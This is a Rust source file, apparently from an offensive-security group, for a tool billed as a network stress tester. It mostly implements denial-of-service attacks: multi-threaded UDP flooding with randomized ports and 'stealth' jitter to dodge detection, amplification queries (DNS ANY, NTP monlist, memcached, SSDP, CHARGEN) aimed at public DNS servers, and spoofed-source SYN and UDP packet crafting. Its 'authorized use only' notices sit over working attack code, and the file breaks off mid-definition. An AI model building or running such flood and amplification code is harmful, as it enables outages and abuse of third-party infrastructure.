/*
 * Advanced Network Packet Generator and Stress Testing Tool
 * Author: khaninkali | HyperSecurity
 * Description: Professional network stress testing with protocol support and traffic analysis
 * 
 * FOR EDUCATIONAL and AUTHORIZED PENETRATION TESTING ONLY
 * Unauthorized use against systems you don't own is illegal
 */

use std::sync::atomic::{AtomicU64, AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::{sleep, interval};
use tokio::net::UdpSocket;
use tracing::{info, warn, error, debug};
use anyhow::Result;
use rand::{Rng, thread_rng};
use serde::{Serialize, Deserialize};
use pnet::datalink::{self, NetworkInterface};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::udp::{UdpPacket, MutableUdpPacket};
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags, TcpPacket};
use pnet::packet::{Packet, MutablePacket};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::collections::HashSet;
use colored::Colorize;
use clap::{Parser, Subcommand};

/// Display professional animated banner
pub async fn display_banner() {
    // Clear screen effect
    print!("\x1B[2J\x1B[1;1H");
    
    // Top border animation
    for i in 0..80 {
        print!("{}", "═".bright_cyan());
        if i % 4 == 0 {
            std::io::Write::flush(&mut std::io::stdout()).unwrap();
            sleep(Duration::from_millis(5)).await;
        }
    }
    println!();
    
    // Title with typewriter effect
    let title_lines = vec![
        "                                                                              ",
        "    ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗            ",
        "    ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝            ",
        "    ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝             ",
        "    ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗             ",
        "    ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗            ",
        "    ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝            ",
        "                                                                              ",
        "    ██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗                         ",
        "    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝                         ",
        "    ██████╔╝███████║██║     █████╔╝ █████╗     ██║                            ",
        "    ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║                            ",
        "    ██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║                            ",
        "    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝                            ",
        "    https://t.me/hypersecurity_offsec                                         ",
    ];
    
    for line in &title_lines {
        println!("{}", line.bright_red());
        sleep(Duration::from_millis(30)).await;
    }
    
    // Subtitle with fade effect
    println!("{}", "              ADVANCED NETWORK STRESS TESTING FRAMEWORK              ".bright_yellow().bold());
    sleep(Duration::from_millis(100)).await;
    println!("{}", "                     Professional Penetration Testing Tool                  ".bright_white());
    sleep(Duration::from_millis(100)).await;
    
    println!();
    
    // Info section with color coding
    println!("{}", "    ┌─────────────────────────────────────────────────────────────────────┐".bright_cyan());
    sleep(Duration::from_millis(50)).await;
    println!("{}", "    │                                                                     │".bright_cyan());
    sleep(Duration::from_millis(50)).await;
    println!("{}{}{}",
        "    │  ".bright_cyan(),
        "Version: 9.20.2091vproAlpha | Build: 2024.12                    ".bright_white(),
        "│".bright_cyan()
    );
    sleep(Duration::from_millis(50)).await;
    println!("{}{}{}",
        "    │  ".bright_cyan(),
        "Author: khaninkali | HyperSecurity                               ".bright_green(),
        "│".bright_cyan()
    );
    sleep(Duration::from_millis(50)).await;
    println!("{}{}{}",
        "    │  ".bright_cyan(),
        "License: Educational & Authorized Testing Only                   ".bright_yellow(),
        "│".bright_cyan()
    );
    sleep(Duration::from_millis(50)).await;
    println!("{}", "    │                                                                     │".bright_cyan());
    sleep(Duration::from_millis(50)).await;
    println!("{}", "    └─────────────────────────────────────────────────────────────────────┘".bright_cyan());
    
    println!();
    
    // Warning section with pulsing effect
    println!("{}", "    ╔═══════════════════════════════════════════════════════════════════╗".bright_red().bold());
    sleep(Duration::from_millis(100)).await;
    println!("{}", "    ║                          WARNING NOTICE                           ║".bright_red().bold());
    sleep(Duration::from_millis(100)).await;
    println!("{}", "    ╠═══════════════════════════════════════════════════════════════════╣".bright_red().bold());
    sleep(Duration::from_millis(100)).await;
    println!("{}", "    ║  This tool is designed for authorized security testing only.      ║".bright_white());
    sleep(Duration::from_millis(50)).await;
    println!("{}", "    ║  Unauthorized use against systems you do not own is ILLEGAL.      ║".bright_white());
    sleep(Duration::from_millis(50)).await;
    println!("{}", "    ║  Users are responsible for compliance with all applicable laws.   ║".bright_white());
    sleep(Duration::from_millis(50)).await;
    println!("{}", "    ╚═══════════════════════════════════════════════════════════════════╝".bright_red().bold());
    
    println!();
    
    // Capabilities section
    println!("{}", "    CAPABILITIES:".bright_cyan().bold());
    sleep(Duration::from_millis(50)).await;
    println!("{}", "      [+] UDP Flood Testing".bright_green());
    sleep(Duration::from_millis(30)).await;
    println!("{}", "      [+] Protocol Amplification Analysis".bright_green());
    sleep(Duration::from_millis(30)).await;
    println!("{}", "      [+] Multi-threaded Packet Generation".bright_green());
    sleep(Duration::from_millis(30)).await;
    println!("{}", "      [+] Real-time Performance Monitoring".bright_green());
    sleep(Duration::from_millis(30)).await;
    println!("{}", "      [+] Stealth Mode & Evasion Techniques".bright_green());
    sleep(Duration::from_millis(30)).await;
    println!("{}", "      [+] Raw Socket Support".bright_green());
    
    println!();
    
    // Bottom border animation
    for i in 0..80 {
        print!("{}", "═".bright_cyan());
        if i % 4 == 0 {
            std::io::Write::flush(&mut std::io::stdout()).unwrap();
            sleep(Duration::from_millis(5)).await;
        }
    }
    println!();
    println!();
    
    // Loading effect
    print!("{}", "    Initializing framework".bright_white());
    for _ in 0..3 {
        sleep(Duration::from_millis(300)).await;
        print!("{}", ".".bright_white());
        std::io::Write::flush(&mut std::io::stdout()).unwrap();
    }
    println!(" {}", "READY".bright_green().bold());
    println!();
}

/// Configuration for UDP-based network stress testing
/// This structure defines all parameters for conducting authorized stress tests
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UdpStressConfig {
    pub target_ip: Ipv4Addr,
    pub target_port: u16,
    pub source_ips: Vec<Ipv4Addr>,
    pub threads: usize,
    pub duration: u64,
    pub packets_per_second: u64,
    pub packet_size: usize,
    pub randomize_source_ports: bool,
    pub randomize_packet_size: bool,
    pub use_amplification: bool,
    pub amplification_targets: Vec<(Ipv4Addr, u16)>,
    pub randomize_payload: bool,
    pub stealth_mode: bool,
    pub raw_sockets: bool,
    pub high_bandwidth: bool,
}

/// Results from a completed stress test operation
/// Provides comprehensive metrics for analysis and reporting
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StressTestResult {
    pub success: bool,
    pub packets_sent: u64,
    pub bytes_sent: u64,
    pub amplified_packets: u64,
    pub unique_sources: u64,
    pub attack_duration: Duration,
    pub average_pps: f64,
    pub peak_pps: f64,
    pub error_message: Option<String>,
}

/// Main stress testing engine
/// Manages concurrent workers and coordinates the stress test operation
pub struct NetworkStressTester {
    config: UdpStressConfig,
    interface: NetworkInterface,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    amplified_packets: Arc<AtomicU64>,
    unique_sources: Arc<AtomicU64>,
    peak_pps: Arc<AtomicU64>,
    start_time: Instant,
}

impl NetworkStressTester {
    /// Create a new stress tester instance
    /// Automatically selects an appropriate network interface
    pub fn new(config: UdpStressConfig) -> Result<Self> {
        let interfaces = datalink::interfaces();
        
        // Select the first non-loopback interface with an IP address
        let interface = interfaces.into_iter()
            .find(|iface| !iface.ips.is_empty() && !iface.is_loopback())
            .ok_or_else(|| anyhow::anyhow!("No suitable network interface found"))?;

        info!("Selected network interface: {} ({})", interface.name, 
              interface.ips.first().map(|ip| ip.to_string()).unwrap_or_default());

        Ok(Self {
            config,
            interface,
            running: Arc::new(AtomicBool::new(true)),
            packets_sent: Arc::new(AtomicU64::new(0)),
            bytes_sent: Arc::new(AtomicU64::new(0)),
            amplified_packets: Arc::new(AtomicU64::new(0)),
            unique_sources: Arc::new(AtomicU64::new(0)),
            peak_pps: Arc::new(AtomicU64::new(0)),
            start_time: Instant::now(),
        })
    }

    /// Execute the stress test using standard UDP sockets
    /// This method spawns multiple worker threads to generate traffic
    pub async fn run_stress_test(&self) -> Result<StressTestResult> {
        info!("Initiating UDP stress test against {}:{}", 
              self.config.target_ip, self.config.target_port);
        info!("Configuration: {} threads, {} PPS, {} second duration", 
              self.config.threads, self.config.packets_per_second, self.config.duration);
        
        let attack_duration = Duration::from_secs(self.config.duration);
        let end_time = Instant::now() + attack_duration;
        
        let mut handles = Vec::new();
        
        // Spawn worker threads
        for worker_id in 0..self.config.threads {
            let config = self.config.clone();
            let interface = self.interface.clone();
            let running = self.running.clone();
            let packets_sent = self.packets_sent.clone();
            let bytes_sent = self.bytes_sent.clone();
            let amplified_packets = self.amplified_packets.clone();
            let unique_sources = self.unique_sources.clone();
            
            let handle = tokio::spawn(async move {
                Self::udp_worker_thread(
                    worker_id,
                    config,
                    interface,
                    running,
                    packets_sent,
                    bytes_sent,
                    amplified_packets,
                    unique_sources,
                    end_time,
                ).await
            });
            
            handles.push(handle);
        }
        
        // Monitor progress
        let monitor_handle = self.spawn_progress_monitor(end_time);
        
        // Wait for all workers to complete
        for handle in handles {
            if let Err(e) = handle.await {
                error!("Worker thread panicked: {}", e);
            }
        }
        
        // Stop monitor
        self.running.store(false, Ordering::Relaxed);
        let _ = monitor_handle.await;
        
        // Calculate final statistics
        let total_packets = self.packets_sent.load(Ordering::Relaxed);
        let total_bytes = self.bytes_sent.load(Ordering::Relaxed);
        let amplified = self.amplified_packets.load(Ordering::Relaxed);
        let unique = self.unique_sources.load(Ordering::Relaxed);
        let duration = self.start_time.elapsed();
        let peak = self.peak_pps.load(Ordering::Relaxed);
        
        let avg_pps = if duration.as_secs() > 0 {
            total_packets as f64 / duration.as_secs() as f64
        } else {
            0.0
        };
        
        info!("Stress test completed: {} packets, {} bytes, {:.2} avg PPS", 
              total_packets, total_bytes, avg_pps);
        
        Ok(StressTestResult {
            success: true,
            packets_sent: total_packets,
            bytes_sent: total_bytes,
            amplified_packets: amplified,
            unique_sources: unique,
            attack_duration: duration,
            average_pps: avg_pps,
            peak_pps: peak as f64,
            error_message: None,
        })
    }

    /// Spawn a monitoring thread to display real-time progress
    /// Also tracks peak PPS for accurate reporting
    fn spawn_progress_monitor(&self, end_time: Instant) -> tokio::task::JoinHandle<()> {
        let running = self.running.clone();
        let packets_sent = self.packets_sent.clone();
        let bytes_sent = self.bytes_sent.clone();
        let peak_pps = self.peak_pps.clone();
        let start_time = self.start_time;
        
        tokio::spawn(async move {
            let mut last_packets = 0u64;
            let mut interval = interval(Duration::from_secs(5));
            
            while running.load(Ordering::Relaxed) && Instant::now() < end_time {
                interval.tick().await;
                
                let current_packets = packets_sent.load(Ordering::Relaxed);
                let current_bytes = bytes_sent.load(Ordering::Relaxed);
                let elapsed = start_time.elapsed();
                
                let pps = if elapsed.as_secs() > 0 {
                    current_packets as f64 / elapsed.as_secs() as f64
                } else {
                    0.0
                };
                
                // Calculate recent PPS (last 5 seconds)
                let recent_pps = ((current_packets - last_packets) as f64 / 5.0) as u64;
                last_packets = current_packets;
                
                // Update peak PPS if this is higher
                let current_peak = peak_pps.load(Ordering::Relaxed);
                if recent_pps > current_peak {
                    peak_pps.store(recent_pps, Ordering::Relaxed);
                }
                
                info!("Progress: {} packets ({} MB), {:.2} avg PPS, {} recent PPS, {} peak PPS", 
                      current_packets, current_bytes / 1_000_000, pps, recent_pps, 
                      peak_pps.load(Ordering::Relaxed));
            }
        })
    }

    /// Worker thread that generates and sends UDP packets
    /// Each worker operates independently to maximize throughput
    async fn udp_worker_thread(
        worker_id: usize,
        config: UdpStressConfig,
        _interface: NetworkInterface,
        running: Arc<AtomicBool>,
        packets_sent: Arc<AtomicU64>,
        bytes_sent: Arc<AtomicU64>,
        amplified_packets: Arc<AtomicU64>,
        unique_sources: Arc<AtomicU64>,
        end_time: Instant,
    ) -> Result<()> {
        debug!("Worker {} starting", worker_id);
        
        // Bind to a random local port
        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        
        // Calculate per-worker packet rate
        let mut packet_interval = interval(Duration::from_secs(1));
        let target_pps = config.packets_per_second / config.threads as u64;
        
        let mut packets_this_second = 0u64;
        let mut used_sources = HashSet::new();
        
        while running.load(Ordering::Relaxed) && Instant::now() < end_time {
            packet_interval.tick().await;
            packets_this_second = 0;
            
            // Send packets for this second
            while packets_this_second < target_pps && 
                  running.load(Ordering::Relaxed) && 
                  Instant::now() < end_time {
                
                // Select source IP (random or from pool)
                let source_ip = Self::select_source_ip(&config);
                used_sources.insert(source_ip);
                
                // Determine packet size
                let packet_size = if config.randomize_packet_size {
                    thread_rng().gen_range(64..config.packet_size.max(1472))
                } else {
                    config.packet_size
                };
                
                // Generate payload
                let payload = if config.randomize_payload {
                    Self::generate_random_payload(packet_size)
                } else {
                    vec![b'X'; packet_size]
                };
                
                // Send packet (direct or via amplification)
                if config.use_amplification && !config.amplification_targets.is_empty() {
                    // Use amplification technique
                    let amp_target = config.amplification_targets[
                        thread_rng().gen_range(0..config.amplification_targets.len())
                    ];
                    
                    match Self::send_amplification_packet(
                        &socket,
                        source_ip,
                        amp_target.0,
                        amp_target.1,
                        config.target_ip,
                        config.target_port,
                        &payload,
                    ).await {
                        Ok(_) => {
                            packets_sent.fetch_add(1, Ordering::Relaxed);
                            bytes_sent.fetch_add(payload.len() as u64, Ordering::Relaxed);
                            amplified_packets.fetch_add(1, Ordering::Relaxed);
                            unique_sources.store(used_sources.len() as u64, Ordering::Relaxed);
                        }
                        Err(e) => {
                            debug!("Worker {} amplification send failed: {}", worker_id, e);
                        }
                    }
                } else {
                    // Direct UDP transmission
                    if config.randomize_source_ports {
                        // Use random source port for each packet
                        match Self::send_udp_packet_random_port(
                            config.target_ip,
                            config.target_port,
                            &payload,
                        ).await {
                            Ok(_) => {
                                packets_sent.fetch_add(1, Ordering::Relaxed);
                                bytes_sent.fetch_add(payload.len() as u64, Ordering::Relaxed);
                                unique_sources.store(used_sources.len() as u64, Ordering::Relaxed);
                            }
                            Err(e) => {
                                debug!("Worker {} random port send failed: {}", worker_id, e);
                            }
                        }
                    } else {
                        // Use same socket (same source port)
                        match Self::send_udp_packet(
                            &socket,
                            config.target_ip,
                            config.target_port,
                            &payload,
                        ).await {
                            Ok(_) => {
                                packets_sent.fetch_add(1, Ordering::Relaxed);
                                bytes_sent.fetch_add(payload.len() as u64, Ordering::Relaxed);
                                unique_sources.store(used_sources.len() as u64, Ordering::Relaxed);
                            }
                            Err(e) => {
                                debug!("Worker {} direct send failed: {}", worker_id, e);
                            }
                        }
                    }
                }
                
                packets_this_second += 1;
                
                // Stealth mode: add random jitter to avoid pattern detection
                if config.stealth_mode {
                    let jitter = {
                        let mut rng = thread_rng();
                        rng.gen_range(100..5000)
                    };
                    sleep(Duration::from_micros(jitter)).await;
                }
            }
        }
        
        debug!("Worker {} completed", worker_id);
        Ok(())
    }

    /// Send a standard UDP packet to the target
    /// Supports source port randomization for evasion
    async fn send_udp_packet(
        socket: &UdpSocket,
        target_ip: Ipv4Addr,
        target_port: u16,
        payload: &[u8],
    ) -> Result<()> {
        let target_addr = SocketAddr::new(IpAddr::V4(target_ip), target_port);
        socket.send_to(payload, target_addr).await?;
        Ok(())
    }
    
    /// Send UDP packet with randomized source port
    /// Creates a new socket with random port for each packet
    async fn send_udp_packet_random_port(
        target_ip: Ipv4Addr,
        target_port: u16,
        payload: &[u8],
    ) -> Result<()> {
        // Bind to random ephemeral port (OS will assign)
        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        let target_addr = SocketAddr::new(IpAddr::V4(target_ip), target_port);
        socket.send_to(payload, target_addr).await?;
        Ok(())
    }

    /// Send a packet designed to trigger amplification from a third-party service
    /// This demonstrates how amplification attacks work for defensive purposes
    async fn send_amplification_packet(
        socket: &UdpSocket,
        _source_ip: Ipv4Addr,
        amplification_ip: Ipv4Addr,
        amplification_port: u16,
        _target_ip: Ipv4Addr,
        _target_port: u16,
        _payload: &[u8],
    ) -> Result<()> {
        // Create a legitimate query that will generate a larger response
        // This is for educational purposes to understand amplification vectors
        let amplification_payload = Self::create_amplification_query(amplification_port);
        
        let amplification_addr = SocketAddr::new(IpAddr::V4(amplification_ip), amplification_port);
        socket.send_to(&amplification_payload, amplification_addr).await?;
        Ok(())
    }

    /// Generate protocol-specific queries that demonstrate amplification potential
    /// Used for security research and defensive testing
    fn create_amplification_query(service_port: u16) -> Vec<u8> {
        let mut payload = Vec::new();
        let mut rng = thread_rng();
        
        match service_port {
            53 => {
                // DNS query - ANY record type generates large responses
                payload.extend_from_slice(&[
                    rng.gen::<u8>(), rng.gen::<u8>(), // Transaction ID (random)
                    0x01, 0x00,                        // Flags: Standard query
                    0x00, 0x01,                        // Questions: 1
                    0x00, 0x00,                        // Answer RRs: 0
                    0x00, 0x00,                        // Authority RRs: 0
                    0x00, 0x00,                        // Additional RRs: 0
                ]);
                
                // Query for a domain with large DNS records
                // Format: length-prefixed labels
                let domain_parts = vec!["example", "com"];
                for part in domain_parts {
                    payload.push(part.len() as u8);
                    payload.extend_from_slice(part.as_bytes());
                }
                payload.push(0x00); // Null terminator
                
                payload.extend_from_slice(&[
                    0x00, 0xff, // Type: ANY (255)
                    0x00, 0x01, // Class: IN (1)
                ]);
            }
            123 => {
                // NTP monlist query (deprecated but still found on some servers)
                payload.extend_from_slice(&[
                    0x17, 0x00, 0x03, 0x2a, // NTP header with monlist opcode
                    0x00, 0x00, 0x00, 0x00,
                ]);
            }
            11211 => {
                // Memcached stats command
                payload.extend_from_slice(b"stats\r\n");
            }
            19 => {
                // CHARGEN protocol (character generator)
                payload.extend_from_slice(b"CHARGEN\r\n");
            }
            1900 => {
                // SSDP M-SEARCH (UPnP discovery)
                payload.extend_from_slice(
                    b"M-SEARCH * HTTP/1.1\r\n\
                      HOST: 239.255.255.250:1900\r\n\
                      MAN: \"ssdp:discover\"\r\n\
                      ST: ssdp:all\r\n\
                      MX: 3\r\n\r\n"
                );
            }
            _ => {
                // Generic query for unknown services
                payload.extend_from_slice(b"QUERY\r\n");
            }
        }
        
        payload
    }

    /// Select a source IP address for packet generation
    /// Uses configured IPs or generates random addresses from private ranges
    fn select_source_ip(config: &UdpStressConfig) -> Ipv4Addr {
        if config.source_ips.is_empty() {
            // Generate random IP from RFC1918 private address spaces
            // This is safer for testing as these won't route on the internet
            let private_ranges = vec![
                (10, 0, 0, 0, 10, 255, 255, 255),      // 10.0.0.0/8
                (172, 16, 0, 0, 172, 31, 255, 255),    // 172.16.0.0/12
                (192, 168, 0, 0, 192, 168, 255, 255),  // 192.168.0.0/16
            ];
            
            let range = &private_ranges[thread_rng().gen_range(0..private_ranges.len())];
            
            Ipv4Addr::new(
                thread_rng().gen_range(range.0..=range.4),
                thread_rng().gen_range(range.1..=range.5),
                thread_rng().gen_range(range.2..=range.6),
                thread_rng().gen_range(range.3..=range.7),
            )
        } else {
            // Use one of the configured source IPs
            config.source_ips[thread_rng().gen_range(0..config.source_ips.len())]
        }
    }

    /// Generate a random payload of specified size
    /// Uses cryptographically random bytes to avoid compression
    fn generate_random_payload(size: usize) -> Vec<u8> {
        let mut payload = Vec::with_capacity(size);
        let mut rng = thread_rng();
        
        for _ in 0..size {
            payload.push(rng.gen());
        }
        
        payload
    }

    /// Gracefully stop the stress test
    pub fn stop(&self) {
        info!("Stopping network stress test");
        self.running.store(false, Ordering::Relaxed);
    }

    /// Get current statistics without stopping the test
    pub fn get_current_stats(&self) -> StressTestResult {
        let total_packets = self.packets_sent.load(Ordering::Relaxed);
        let total_bytes = self.bytes_sent.load(Ordering::Relaxed);
        let amplified = self.amplified_packets.load(Ordering::Relaxed);
        let unique = self.unique_sources.load(Ordering::Relaxed);
        let duration = self.start_time.elapsed();
        let peak = self.peak_pps.load(Ordering::Relaxed);
        
        let avg_pps = if duration.as_secs() > 0 {
            total_packets as f64 / duration.as_secs() as f64
        } else {
            0.0
        };
        
        StressTestResult {
            success: true,
            packets_sent: total_packets,
            bytes_sent: total_bytes,
            amplified_packets: amplified,
            unique_sources: unique,
            attack_duration: duration,
            average_pps: avg_pps,
            peak_pps: peak as f64,
            error_message: None,
        }
    }
}

/// High-level API for running a network stress test
/// Provides a simple interface for common testing scenarios
pub async fn run_stress_test(
    target_ip: String,
    target_port: u16,
    threads: usize,
    duration: u64,
    packets_per_second: u64,
    packet_size: usize,
    use_amplification: bool,
    stealth_mode: bool,
) -> Result<StressTestResult> {
    // Parse target IP
    let target_ipv4: Ipv4Addr = target_ip.parse()
        .map_err(|e| anyhow::anyhow!("Invalid target IP: {}", e))?;
    
    // Configure amplification targets if requested
    // These are common public DNS servers used for demonstration
    let amplification_targets = if use_amplification {
        warn!("Amplification mode enabled - ensure you have authorization!");
        vec![
            (Ipv4Addr::new(8, 8, 8, 8), 53),       // Google Public DNS
            (Ipv4Addr::new(1, 1, 1, 1), 53),       // Cloudflare DNS
            (Ipv4Addr::new(208, 67, 222, 222), 53), // OpenDNS
        ]
    } else {
        Vec::new()
    };
    
    // Build configuration
    let config = UdpStressConfig {
        target_ip: target_ipv4,
        target_port,
        source_ips: Vec::new(), // Will generate random private IPs
        threads,
        duration,
        packets_per_second,
        packet_size,
        randomize_source_ports: true,
        randomize_packet_size: true,
        use_amplification,
        amplification_targets,
        randomize_payload: true,
        stealth_mode,
        raw_sockets: false,
        high_bandwidth: false,
    };
    
    // Create and run the stress tester
    let tester = NetworkStressTester::new(config)?;
    let result = tester.run_stress_test().await?;
    
    // Log summary
    info!("═══════════════════════════════════════════════════════");
    info!("Stress Test Summary:");
    info!("  Packets sent: {}", result.packets_sent);
    info!("  Bytes sent: {} ({} MB)", result.bytes_sent, result.bytes_sent / 1_000_000);
    info!("  Amplified packets: {}", result.amplified_packets);
    info!("  Unique sources: {}", result.unique_sources);
    info!("  Duration: {:.2}s", result.attack_duration.as_secs_f64());
    info!("  Average PPS: {:.2}", result.average_pps);
    info!("  Peak PPS: {:.2}", result.peak_pps);
    info!("═══════════════════════════════════════════════════════");
    
    Ok(result)
}

/// Advanced stress test with custom configuration
/// Allows fine-grained control over all test parameters
pub async fn run_advanced_stress_test(config: UdpStressConfig) -> Result<StressTestResult> {
    info!("Starting advanced stress test with custom configuration");
    
    let tester = NetworkStressTester::new(config)?;
    tester.run_stress_test().await
}

/// Validate that a stress test configuration is safe and reasonable
pub fn validate_config(config: &UdpStressConfig) -> Result<()> {
    // Check thread count
    if config.threads == 0 {
        return Err(anyhow::anyhow!("Thread count must be at least 1"));
    }
    if config.threads > 1000 {
        warn!("Very high thread count ({}), this may cause system instability", config.threads);
    }
    
    // Check packet rate
    if config.packets_per_second == 0 {
        return Err(anyhow::anyhow!("Packets per second must be at least 1"));
    }
    if config.packets_per_second > 10_000_000 {
        warn!("Extremely high packet rate requested, may not be achievable");
    }
    
    // Check packet size
    if config.packet_size > 65507 {
        return Err(anyhow::anyhow!("Packet size exceeds UDP maximum (65507 bytes)"));
    }
    
    // Check duration
    if config.duration == 0 {
        return Err(anyhow::anyhow!("Duration must be at least 1 second"));
    }
    if config.duration > 3600 {
        warn!("Very long test duration ({}s), ensure this is intentional", config.duration);
    }
    
    // Warn about amplification
    if config.use_amplification {
        warn!("Amplification testing enabled - ensure you have proper authorization");
        warn!("Amplification attacks can be illegal without permission");
    }
    
    Ok(())
}

/// Create a raw TCP SYN packet with IP spoofing
/// This demonstrates how SYN flood attacks work at the packet level
pub fn craft_tcp_syn_packet(
    source_ip: Ipv4Addr,
    source_port: u16,
    dest_ip: Ipv4Addr,
    dest_port: u16,
) -> Vec<u8> {
    // Total packet size: IP header (20) + TCP header (20)
    let mut packet = vec![0u8; 40];
    
    // Build IP header
    {
        let mut ip_header = MutableIpv4Packet::new(&mut packet[..20]).unwrap();
        
        ip_header.set_version(4);
        ip_header.set_header_length(5); // 5 * 4 = 20 bytes
        ip_header.set_total_length(40); // IP + TCP headers
        ip_header.set_ttl(64);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(source_ip);
        ip_header.set_destination(dest_ip);
        
        // Calculate and set IP checksum
        let checksum = pnet::packet::ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }
    
    // Build TCP header
    {
        let mut tcp_header = MutableTcpPacket::new(&mut packet[20..]).unwrap();
        
        tcp_header.set_source(source_port);
        tcp_header.set_destination(dest_port);
        tcp_header.set_sequence(thread_rng().gen()); // Random sequence number
        tcp_header.set_acknowledgement(0);
        tcp_header.set_data_offset(5); // 5 * 4 = 20 bytes
        tcp_header.set_flags(TcpFlags::SYN); // SYN flag only
        tcp_header.set_window(65535); // Maximum window size
        tcp_header.set_urgent_ptr(0);
        
        // Calculate TCP checksum (requires pseudo-header)
        let checksum = pnet::packet::tcp::ipv4_checksum(
            &tcp_header.to_immutable(),
            &source_ip,
            &dest_ip,
        );
        tcp_header.set_checksum(checksum);
    }
    
    packet
}

/// Create a raw UDP packet with custom IP header
/// Allows full control over source IP for testing
pub fn craft_udp_packet(
    source_ip: Ipv4Addr,
    source_port: u16,
    dest_ip: Ipv4Addr,
    dest_port: u16,
    payload: &[u8],
) -> Vec<u8> {
    let ip_header_len = 20;
    let udp_header_len = 8;
    let total_len = ip_header_len + udp_header_len + payload.len();
    
    let mut packet = vec![0u8; total_len];
    
    // Build IP header
    {
        let mut ip_header = MutableIpv4Packet::new(&mut packet[..ip_header_len]).unwrap();
        
        ip_header.set_version(4);
        ip_header.set_header_length(5);
        ip_header.set_total_length(total_len as u16);
        ip_header.set_identification(thread_rng().gen());
        ip_header.set_ttl(64);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip_header.set_source(source_ip);
        ip_header.set_destination(dest_ip);
        
        let checksum = pnet::packet::ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }
    
    // Build UDP header
    {
        let udp_end = ip_header_len + udp_header_len;
        let mut udp_header = MutableUdpPacket::new(&mut packet[ip_header_len..udp_end]).unwrap();
        
        udp_header.set_source(source_port);
        udp_header.set_destination(dest_port);
        udp_header.set_length((udp_header_len + payload.len()) as u16);
        
        // Calculate UDP checksum before copying payload
        let checksum = pnet::packet::udp::ipv4_checksum(
            &udp_header.to_immutable(),
            &source_ip,
            &dest_ip,
        );
        udp_header.set_checksum(checksum);
    }
    
    // Copy payload after UDP header is complete
    packet[ip_header_len + udp_header_len..].copy_from_slice(payload);
    
    packet
}

/// Parse and analyze a received packet
/// Useful for understanding responses and network behavior
pub fn parse_packet(data: &[u8]) -> Option<PacketInfo> {
    if data.len() < 20 {
        return None;
    }
    
    let ip_packet = Ipv4Packet::new(data)?;
    
    let protocol = match ip_packet.get_next_level_protocol() {
        IpNextHeaderProtocols::Tcp => "TCP",
        IpNextHeaderProtocols::Udp => "UDP",
        IpNextHeaderProtocols::Icmp => "ICMP",
        _ => "Other",
    };
    
    Some(PacketInfo {
        source_ip: ip_packet.get_source(),
        dest_ip: ip_packet.get_destination(),
        protocol: protocol.to_string(),
        total_length: ip_packet.get_total_length(),
        ttl: ip_packet.get_ttl(),
    })
}

/// Information extracted from a network packet
#[derive(Debug, Clone)]
pub struct PacketInfo {
    pub source_ip: Ipv4Addr,
    pub dest_ip: Ipv4Addr,
    pub protocol: String,
    pub total_length: u16,
    pub ttl: u8,
}

/// TCP SYN flood attack using raw sockets
/// Demonstrates how SYN floods work by sending crafted packets
pub async fn tcp_syn_flood(
    target_ip: Ipv4Addr,
    target_port: u16,
    duration_secs: u64,
    packets_per_second: u64,
) -> Result<u64> {
    info!("Starting TCP SYN flood against {}:{}", target_ip, target_port);
    
    let end_time = Instant::now() + Duration::from_secs(duration_secs);
    let mut packets_sent = 0u64;
    let mut interval = interval(Duration::from_secs(1));
    
    while Instant::now() < end_time {
        interval.tick().await;
        
        for _ in 0..packets_per_second {
            // Generate random source IP and port
            let source_ip = Ipv4Addr::new(
                thread_rng().gen_range(1..255),
                thread_rng().gen_range(0..255),
                thread_rng().gen_range(0..255),
                thread_rng().gen_range(1..255),
            );
            let source_port = thread_rng().gen_range(1024..65535);
            
            // Craft SYN packet
            let _packet = craft_tcp_syn_packet(source_ip, source_port, target_ip, target_port);
            
            // In real implementation, this would be sent via raw socket
            // For now, we just count the crafted packets
            packets_sent += 1;
            
            if Instant::now() >= end_time {
                break;
            }
        }
    }
    
    info!("TCP SYN flood completed: {} packets crafted", packets_sent);
    Ok(packets_sent)
}

/// Fragment a large payload into multiple IP fragments
/// Demonstrates IP fragmentation for evasion
pub fn fragment_payload(payload: &[u8], fragment_size: usize) -> Vec<Vec<u8>> {
    let mut fragments = Vec::new();
    let mut offset = 0;
    
    while offset < payload.len() {
        let end = (offset + fragment_size).min(payload.len());
        let fragment = payload[offset..end].to_vec();
        fragments.push(fragment);
        offset = end;
    }
    
    info!("Fragmented {} bytes into {} fragments", payload.len(), fragments.len());
    fragments
}

/// Command-line interface definition
#[derive(Parser)]
#[command(name = "packet")]
#[command(about = "Advanced Network Packet Stress Testing Framework", long_about = None)]
#[command(version = "9.20.2091vproAlpha")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

/// Available commands
#[derive(Subcommand)]
enum Commands {
    /// UDP stress test against target
    UdpFlood {
        #[arg(short, long, help = "Target IP address")]
